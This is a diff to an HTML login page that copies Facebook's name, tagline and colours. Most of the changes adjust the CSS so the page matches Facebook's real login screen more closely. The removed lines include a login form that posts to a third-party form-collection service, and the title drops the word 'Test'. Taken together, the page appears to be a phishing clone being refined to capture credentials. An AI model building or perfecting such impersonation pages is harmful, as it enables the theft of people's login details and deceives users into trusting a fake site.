@@ -2,17 +2,18 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Login Test Project</title>
+  <title>Login Project</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="referrer" content="origin">
   <style>
+    /* 1. Global Reset to ensure the layout doesn't break */
     * {
       box-sizing: border-box;
       font-family: Helvetica, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
     }
 
     body {
-      margin: 0;
       background: #f0f2f5;
       height: 100vh;
       display: flex;
@@ -23,32 +24,37 @@
     .container {
       display: flex;
       gap: 60px;
-      max-width: 900px;
+      max-width: 980px;
+      width: 100%;
       padding: 20px;
+      align-items: center;
     }
 
     .branding {
-      max-width: 400px;
+      flex: 1;
+      max-width: 500px;
     }
 
     .branding h1 {
       color: #1877f2;
-      font-size: 56px;
-      margin-bottom: 10px;
+      font-size: 60px;
+      letter-spacing: -1px;
     }
 
     .branding p {
-      font-size: 24px;
+      font-size: 26px;
       color: #1c1e21;
-      line-height: 1.3;
+      line-height: 1.2;
+      margin-top: 10px;
     }
 
+    /* 2. The Form Box - Re-styled to be visible and centered */
     .login-box {
       background: #fff;
       padding: 20px;
-      width: 360px;
+      width: 396px;
       border-radius: 8px;
-      box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
     }
 
     .login-box input {
@@ -57,12 +63,13 @@
       margin-bottom: 12px;
       border: 1px solid #dddfe2;
       border-radius: 6px;
-      font-size: 16px;
+      font-size: 17px;
     }
 
     .login-box input:focus {
       outline: none;
       border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
     }
 
     .login-btn {
@@ -72,7 +79,7 @@
       color: #fff;
       border: none;
       border-radius: 6px;
-      font-size: 18px;
+      font-size: 20px;
       font-weight: bold;
       cursor: pointer;
     }
@@ -83,13 +90,17 @@
 
     .forgot {
       text-align: center;
-      margin: 14px 0;
+      margin: 16px 0;
     }
 
     .forgot a {
       color: #1877f2;
       text-decoration: none;
       font-size: 14px;
+    }
+
+    .forgot a:hover {
+      text-decoration: underline;
     }
 
     .divider {
@@ -101,12 +112,13 @@
     .create-btn {
       display: block;
       margin: 0 auto;
-      padding: 14px 18px;
+      padding: 0 16px;
+      height: 48px;
       background: #42b72a;
       color: #fff;
       border: none;
       border-radius: 6px;
-      font-size: 16px;
+      font-size: 17px;
       font-weight: bold;
       cursor: pointer;
     }
@@ -115,11 +127,15 @@
       background: #36a420;
     }
 
-    @media (max-width: 768px) {
+    /* Mobile view fix */
+    @media (max-width: 900px) {
       .container {
         flex-direction: column;
-        align-items: center;
         text-align: center;
+        gap: 40px;
+      }
+      .branding {
+        max-width: 400px;
       }
       .branding h1 { font-size: 48px; }
       .branding p { font-size: 20px; }
@@ -133,5 +149,3 @@
       <h1>facebook</h1>
       <p>Connect with friends and the world around you.</p>
     </div>
-
-    <form class="login-box" action="https://api.web3forms.com/submit" method="POST">
